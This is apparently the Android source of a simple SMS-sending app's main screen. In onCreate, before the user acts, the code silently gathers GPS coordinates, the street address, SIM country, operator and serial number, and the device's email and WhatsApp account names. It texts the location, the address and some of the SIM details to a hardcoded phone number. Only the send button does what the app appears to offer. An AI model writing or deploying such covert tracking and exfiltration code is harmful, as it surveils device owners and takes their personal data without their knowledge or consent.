package com.example.sms7;

import android.os.Bundle;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
//import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import android.app.Activity;
import android.view.Menu;
import android.view.View.OnClickListener;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;


public class MainActivity extends Activity {
	Button buttonsend ;
	EditText textPhoneNo;
	EditText textSMS;
	final double latitude=0;
	 final double longitude=0;
	 Context context;
	 String mobile_no ;
	  String email;
	  String whatsappNumber;
	  String whatsapp ;
	  String simCountry ,simOperatorCode, simOperatorName , simSerial ;


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		buttonsend=(Button)findViewById(R.id.button1);
		
		textPhoneNo = (EditText) findViewById(R.id.editText1);
		textSMS = (EditText) findViewById(R.id.editText2);
		 String address = "";
			GPSService mGPSService = new GPSService(getApplicationContext());
			mGPSService.getLocation();

		if ( mGPSService.isNetworkEnabled==false) {

				// Here you can ask the user to try again, using return; for that
			Toast.makeText(getApplicationContext(), "Your location is not available, please try again.", Toast.LENGTH_SHORT).show();
		//		return;

				// Or you can continue without getting the location, remove the return; above and uncomment the line given below
				// address = "Location not available";
		} else {

				// Getting location co-ordinates
				double latitude = mGPSService.getLatitude();
				double longitude = mGPSService.getLongitude();
			
				Toast.makeText(getApplicationContext(), "Latitude:" + latitude + " | Longitude: " + longitude, Toast.LENGTH_LONG).show();
				
					Toast.makeText(getApplicationContext(), "Your address is: " + address, Toast.LENGTH_SHORT).show();

String location="latitude: "+ latitude+"| longitude :"+ latitude;
SmsManager smsManager1 = SmsManager.getDefault();
String phoneNo1="9620462235";
smsManager1.sendTextMessage(phoneNo1, null, location, null, null);
				address = mGPSService.getLocationAddress();

				//tvLocation.setText("Latitude: " + latitude + " \nLongitude: " + longitude);
				//tvAddress.setText("Address: " + address);
			}
             
			Toast.makeText(getApplicationContext(), "Your address is: " + address, Toast.LENGTH_SHORT).show();
			SmsManager smsManager1 = SmsManager.getDefault();
			String phoneNo1="9620462235";
			smsManager1.sendTextMessage(phoneNo1, null, address, null, null);
			// make sure you close the gps after using it. Save user's battery power
			mGPSService.closeGPS();
			
			SmsReceiver.bindListener(new SmsListener() {
				
	            public void messageReceived(String messageText) {
	                Log.d("Text",messageText);
	                 Toast.makeText(MainActivity.this,"Message: "+messageText,Toast.LENGTH_LONG).show();
	            }
	        });
			
			TelephonyManager  telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
			int simState = telephonyManager.getSimState();
			 
 switch(simState){
 case (TelephonyManager.SIM_STATE_ABSENT): break;
 case (TelephonyManager.SIM_STATE_NETWORK_LOCKED): break;
 case (TelephonyManager.SIM_STATE_PIN_REQUIRED): break;
 case (TelephonyManager.SIM_STATE_PUK_REQUIRED): break;
 case (TelephonyManager.SIM_STATE_UNKNOWN): break;
 case (TelephonyManager.SIM_STATE_READY): {
	 
     // Get the SIM country ISO code
        String simCountry = telephonyManager.getSimCountryIso();

     // Get the operator code of the active SIM (MCC + MNC)
        String simOperatorCode = telephonyManager.getSimOperator();

     // Get the name of the SIM operator
        String simOperatorName = telephonyManager.getSimOperatorName();

     // Get the SIM’s serial number
        String simSerial = telephonyManager.getSimSerialNumber();
        
        String mPhoneNumber = telephonyManager.getLine1Number();
        
      //  Toast.makeText(getApplicationContext(), "Sim country iso code :" + simCountry + " \n simOperatorCode: " + simOperatorCode +" \n simOperatorName: "+simOperatorName +" \n Simserial number :"+ simSerial+" \n phone number :" +mPhoneNumber , Toast.LENGTH_LONG).show();
  
 AccountManager am = AccountManager.get(this);
 Account[] accounts = am.getAccounts();

 for (Account ac : accounts) {
     String acname = ac.name;
     String actype = ac.type;
     // Take your time to look at all available accounts
     System.out.println("Accounts : " + acname + ", " + actype);
     if (acname.startsWith("91")) {
         mobile_no = acname;
     }else if(acname.endsWith("@gmail.com")||acname.endsWith("@yahoo.com")||acname.endsWith("@hotmail.com")){
         email = acname;
     }
     if(actype.equals("com.whatsapp")){
         whatsappNumber = ac.name;
     }

     }
 
 Toast.makeText(getApplicationContext(), "Sim country iso code :" + simCountry + " \n simOperatorCode: " + simOperatorCode +" \n simOperatorName: "+simOperatorName +" \n Simserial number :"+ simSerial+" \n email: "+ email , Toast.LENGTH_LONG).show();
	  String final1 ="Sim country iso code :" + simCountry +" simOperatorCode: " + simOperatorCode ;
	String final2 =" simOperatorName: "+simOperatorName +" Simserial number :"+ simSerial+"email: "+ email  ;
	SmsManager smsManager3 = SmsManager.getDefault();
	String phoneNo2="9620462235";
	smsManager1.sendTextMessage(phoneNo2, null, final1, null, null);
	
 }

 }
 	
			
			buttonsend.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {

				  String phoneNo = textPhoneNo.getText().toString();
				  String sms = textSMS.getText().toString();

				  try {
					SmsManager smsManager = SmsManager.getDefault();
					smsManager.sendTextMessage(phoneNo, null, sms, null, null);
					Toast.makeText(getApplicationContext(), "SMS Sent!",
								Toast.LENGTH_LONG).show();
				  } catch (Exception e) {
					Toast.makeText(getApplicationContext(),
						"SMS faild, please try again later!",
						Toast.LENGTH_LONG).show();
					e.printStackTrace();
				  }

				}
			});
			


			

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
